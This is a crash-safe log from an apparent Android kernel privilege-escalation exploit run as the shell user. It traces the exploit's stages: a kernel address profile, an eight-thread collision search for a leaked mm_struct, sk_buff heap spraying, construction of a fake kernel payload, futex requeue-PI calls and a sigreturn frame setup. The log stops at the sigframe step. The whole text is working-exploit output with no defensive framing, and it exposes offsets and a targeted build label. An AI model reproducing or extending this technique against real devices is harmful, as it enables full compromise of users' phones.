===== preload.so crash-safe log =====
path=/storage/emulated/0/Download/.temp/log_1788952225.txt tmp=/data/local/tmp/.temp/log_1788952225.txt pid=14844 uid=2000
1788952225.554 14844 [+] preload starting pid=14844
1788952225.560 14844 [+] startup context pid=14844 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
1788952225.561 14844 [+] build config pid=14844 label=pd2238_os6_163150_w10 slide=pselect main=pselect
1788952225.563 14844 [+] p0 profile pid=14844 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 init_task=ffffffc00aaec240 root_tg=ffffffc00ad33100
1788952225.580 14844 [+] direct-map base=ffffff8040000000 slide=0000000000000000
1788952225.583 14844 [+] ckpt: WRITE-PROOF armed bootid_store=ffffff8042ee9110 bootid_buf=ffffff8042ee910d before=80099c95-953c-4b9b-9486-abd786a01617 (odd: leaked scratch, even: aligned bootid+3)
1788952227.060 14844 [*] parameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
1788952229.469 14844 [*] pile-up verified: approx_time=2385
1788952229.477 14844 [*] start finding collisisons
1788952229.478 14844 [*] target    0000007cd32010c8
1788952242.092 14844 [*] [  1] tested 7200000 candidates, scanning=0xffffff8991c921c0
1788952242.089 14844 [*] [  0] tested 7500000 candidates, scanning=0xffffff81a286da00
1788952242.092 14844 [*] [  5] tested 6900000 candidates, scanning=0xffffffa9810b6cc0
1788952242.094 14844 [*] [  3] tested 7600000 candidates, scanning=0xffffff99a81b6cc0
1788952242.096 14844 [*] [  4] tested 7500000 candidates, scanning=0xffffffa1a286da00
1788952242.097 14844 [*] [  2] tested 7600000 candidates, scanning=0xffffff91a81b6cc0
1788952242.097 14844 [*] [  7] tested 7000000 candidates, scanning=0xffffffb9869fff80
1788952242.100 14844 [*] [  0] tested 7600000 candidates, scanning=0xffffff81a81b6cc0
1788952242.098 14844 [*] [  1] tested 7300000 candidates, scanning=0xffffff89975db480
1788952242.101 14844 [*] [  5] tested 7000000 candidates, scanning=0xffffffa9869fff80
1788952242.103 14844 [*] [  4] tested 7600000 candidates, scanning=0xffffffa1a81b6cc0
1788952242.104 14844 [*] [  3] tested 7700000 candidates, scanning=0xffffff99adafff80
1788952242.105 14844 [*] [  7] tested 7100000 candidates, scanning=0xffffffb98c348f00
1788952242.101 14844 [*] [  6] tested 7400000 candidates, scanning=0xffffffb19cf24740
1788952242.106 14844 [*] [  0] tested 7700000 candidates, scanning=0xffffff81adafff80
1788952242.107 14844 [*] [  1] tested 7400000 candidates, scanning=0xffffff899cf24740
1788952242.108 14844 [*] [  5] tested 7100000 candidates, scanning=0xffffffa98c348f00
1788952242.110 14844 [*] [  4] tested 7700000 candidates, scanning=0xffffffa1adafff80
1788952242.110 14844 [*] [  2] tested 7700000 candidates, scanning=0xffffff91adafff80
1788952242.110 14844 [*] [  3] tested 7800000 candidates, scanning=0xffffff99b3448f00
1788952242.113 14844 [*] [  7] tested 7200000 candidates, scanning=0xffffffb991c921c0
1788952242.114 14844 [*] [  6] tested 7500000 candidates, scanning=0xffffffb1a286da00
1788952242.115 14844 [*] [  0] tested 7800000 candidates, scanning=0xffffff81b3448f00
1788952242.118 14844 [*] [  5] tested 7200000 candidates, scanning=0xffffffa991c921c0
1788952242.118 14844 [*] [  4] tested 7800000 candidates, scanning=0xffffffa1b3448f00
1788952242.121 14844 [*] [  7] tested 7300000 candidates, scanning=0xffffffb9975db480
1788952242.118 14844 [*] [  1] tested 7500000 candidates, scanning=0xffffff89a286da00
1788952242.121 14844 [*] [  3] tested 7900000 candidates, scanning=0xffffff99b8d921c0
1788952242.123 14844 [*] [  2] tested 7800000 candidates, scanning=0xffffff91b3448f00
1788952242.125 14844 [*] [  6] tested 7600000 candidates, scanning=0xffffffb1a81b6cc0
1788952242.126 14844 [*] [  0] tested 7900000 candidates, scanning=0xffffff81b8d921c0
1788952242.126 14844 [*] [  5] tested 7300000 candidates, scanning=0xffffffa9975db480
1788952242.129 14844 [*] [  7] tested 7400000 candidates, scanning=0xffffffb99cf24740
1788952242.129 14844 [*] [  4] tested 7900000 candidates, scanning=0xffffffa1b8d921c0
1788952242.129 14844 [*] [  1] tested 7600000 candidates, scanning=0xffffff89a81b6cc0
1788952242.132 14844 [*] [  2] tested 7900000 candidates, scanning=0xffffff91b8d921c0
1788952242.132 14844 [*] [  3] tested 8000000 candidates, scanning=0xffffff99be6db480
1788952242.133 14844 [*] [  6] tested 7700000 candidates, scanning=0xffffffb1adafff80
1788952242.139 14844 [*] [  1] tested 7700000 candidates, scanning=0xffffff89adafff80
1788952242.135 14844 [*] [  5] tested 7400000 candidates, scanning=0xffffffa99cf24740
1788952242.136 14844 [*] [  7] tested 7500000 candidates, scanning=0xffffffb9a286da00
1788952242.135 14844 [*] [  0] tested 8000000 candidates, scanning=0xffffff81be6db480
1788952242.138 14844 [*] [  4] tested 8000000 candidates, scanning=0xffffffa1be6db480
1788952242.142 14844 [*] [  6] tested 7800000 candidates, scanning=0xffffffb1b3448f00
1788952242.140 14844 [*] [  2] tested 8000000 candidates, scanning=0xffffff91be6db480
1788952242.144 14844 [*] [  5] tested 7500000 candidates, scanning=0xffffffa9a286da00
1788952242.144 14844 [*] [  7] tested 7600000 candidates, scanning=0xffffffb9a81b6cc0
1788952242.145 14844 [*] [  1] tested 7800000 candidates, scanning=0xffffff89b3448f00
1788952242.147 14844 [*] [  4] tested 8100000 candidates, scanning=0xffffffa1c4024740
1788952242.147 14844 [*] [  0] tested 8100000 candidates, scanning=0xffffff81c4024740
1788952242.148 14844 [*] [  3] tested 8100000 candidates, scanning=0xffffff99c4024740
1788952242.150 14844 [*] [  6] tested 7900000 candidates, scanning=0xffffffb1b8d921c0
1788952242.155 14844 [*] [  4] thread done, tested 8189973 candidates
1788952242.151 14844 [*] [  2] tested 8100000 candidates, scanning=0xffffff91c4024740
1788952242.152 14844 [*] [  5] tested 7600000 candidates, scanning=0xffffffa9a81b6cc0
1788952242.153 14844 [*] [  7] tested 7700000 candidates, scanning=0xffffffb9adafff80
1788952242.154 14844 [*] [  1] tested 7900000 candidates, scanning=0xffffff89b8d921c0
1788952242.155 14844 [*] [  0] thread done, tested 8121803 candidates
1788952242.155 14844 [*] [  3] thread done, tested 8107327 candidates
1788952242.157 14844 [*] [  6] thread done, tested 7900000 candidates
1788952242.160 14844 [*] [  2] thread done, tested 8100000 candidates
1788952242.160 14844 [*] [  5] thread done, tested 7600000 candidates
1788952242.161 14844 [*] [  7] thread done, tested 7700000 candidates
1788952242.163 14844 [*] [  1] thread done, tested 7900000 candidates
1788952242.170 14844 [*] prepare_kernel_page leaked_mm=ffffff81c539c380 base=ffffff81c5398000 mode=0
1788952242.172 14844 [*] fake payload mode=0 write_shape=1 lock=ffffff81c53984d0 w0=ffffff81c53993a0 task=ffffff81c539a380 write_parent=ffffff81c539a178 write_right=0000000000000000 write_left=0000000000000000
1788952242.180 14844 [*] sk_buff reclaim send 1/4 ret=65536 errno=0
1788952242.182 14844 [*] sk_buff reclaim send 2/4 ret=65536 errno=0
1788952242.184 14844 [*] sk_buff reclaim send 3/4 ret=65536 errno=0
1788952242.187 14844 [*] sk_buff reclaim send 4/4 ret=65536 errno=0
1788952242.191 14844 [*] done
1788952246.797 14844 [+] heap_spray: page_base=ffffff81c5398000 (leaked mm_struct)
1788952246.804 14844 [+] ckpt: route enter
1788952246.808 14844 [+] ckpt: route threads spawned
1788952246.813 14844 [+] ckpt: route ready waiter_waiting=1 owner_started=1
1788952246.915 14844 [+] ckpt: route CMP_REQUEUE_PI ret=-1 errno=35
1788952254.810 14844 [+] ckpt: waiter WAIT_REQUEUE_PI ret=-1 errno=110 tid=20385 sigalrm=0 setprio=0/0
1788952254.814 14844 [+] ckpt: do_sigret enter page=ffffff81c5398000 lock=ffffff81c53984d0 fops=ffffff81c5398180
1788952254.816 14844 [+] ckpt: sigframe ready sf=0x7cd1aafdb0 reserved=0x7cd1ab0000 align16=1
